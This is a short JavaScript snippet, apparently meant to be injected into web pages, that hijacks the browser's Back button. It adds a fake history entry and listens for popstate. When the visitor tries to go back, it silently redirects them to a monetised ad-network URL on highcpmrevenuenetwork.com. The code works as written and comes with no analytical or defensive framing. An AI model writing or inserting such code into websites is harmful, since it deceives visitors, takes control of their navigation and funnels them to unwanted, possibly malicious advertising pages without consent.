(function(window, location) { 
history.replaceState(null, document.title, location.pathname+"#!/history"); 
history.pushState(null, document.title, location.pathname); 
 
window.addEventListener("popstate", function() { 
  if(location.hash === "#!/history") { 
    history.replaceState(null, document.title, location.pathname); 
    setTimeout(function(){ 
      location.replace("https://www.highcpmrevenuenetwork.com/r1efsytmmv?key=cd19aa4ad1ae32a932fea2efb52e68cf"); 
    },10); 
  } 
}, false); 
}(window, location));
